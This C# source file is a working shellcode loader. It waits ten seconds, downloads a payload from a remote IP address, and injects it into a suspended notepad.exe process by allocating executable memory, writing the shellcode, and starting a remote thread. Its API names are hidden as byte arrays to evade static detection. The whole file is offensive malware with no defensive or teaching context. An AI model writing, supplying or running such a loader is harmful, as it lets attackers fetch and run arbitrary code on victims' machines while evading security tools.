using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class Program
{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [DllImport("kernel32.dll")]
    private static extern bool ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    private static string DecryptString(byte[] encryptedData)
    {
        return Encoding.UTF8.GetString(encryptedData);
    }

    private static readonly byte[] encCreateProcess = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x41, 0x00 };
    private static readonly byte[] encWriteProcessMemory = { 0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00 };
    private static readonly byte[] encVirtualAllocEx = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x45, 0x78, 0x00 };

    private delegate bool WriteProcessMemoryFunc(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    private static readonly WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptString(encWriteProcessMemory)), typeof(WriteProcessMemoryFunc));

    private delegate bool CreateProcessAFunc(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    private static readonly CreateProcessAFunc pwCreateProcess = (CreateProcessAFunc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptString(encCreateProcess)), typeof(CreateProcessAFunc));

    private delegate IntPtr VirtualAllocExFunc(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    private static readonly VirtualAllocExFunc pwVirtualAllocEx = (VirtualAllocExFunc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptString(encVirtualAllocEx)), typeof(VirtualAllocExFunc));

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    static void Main()
    {
        Thread.Sleep(10000);

        string url = "http://192.168.45.207/shellcode.bin";
        byte[] payload = new WebClient().DownloadData(url);

        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        if (!pwCreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi))
        {
            return;
        }

        IntPtr victimProcess = pi.hProcess;
        IntPtr shellAddress = pwVirtualAllocEx(victimProcess, IntPtr.Zero, (uint)payload.Length, 0x00001000 | 0x00002000, 0x40);
        IntPtr bytesWritten;

        pwProcmem(victimProcess, shellAddress, payload, (uint)payload.Length, out bytesWritten);

        IntPtr threadId;
        CreateRemoteThread(victimProcess, IntPtr.Zero, 0, shellAddress, IntPtr.Zero, 0, out threadId);
    }
}
